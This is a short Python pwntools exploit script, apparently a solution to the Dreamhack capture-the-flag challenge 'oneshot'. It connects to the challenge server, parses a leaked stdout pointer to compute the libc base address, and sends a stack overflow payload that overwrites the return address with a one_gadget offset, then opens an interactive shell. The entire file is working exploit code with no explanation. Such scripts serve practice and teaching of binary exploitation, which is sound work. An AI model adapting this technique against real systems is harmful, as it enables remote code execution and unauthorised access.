#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./oneshot_patched',checksec=False)
libc = ELF('./libc.so.6',checksec=False)
Host= 'host3.dreamhack.games'
Port= 10492
r = remote(Host,Port)
# r = process(exe.path)
input()

r.recvuntil(b'stdout: ')
stdout = int(r.recv(14),16)
libc.address = stdout - libc.sym['_IO_2_1_stdout_']

log.info('Stdout: ' + hex(stdout))
log.info('Libc base: '+ hex(libc.address))


payload = b'A'*0x18 + p64(0) + p64(0) + p64(0x45216 + libc.address)

r.sendafter(b'MSG: ',payload)
r.interactive()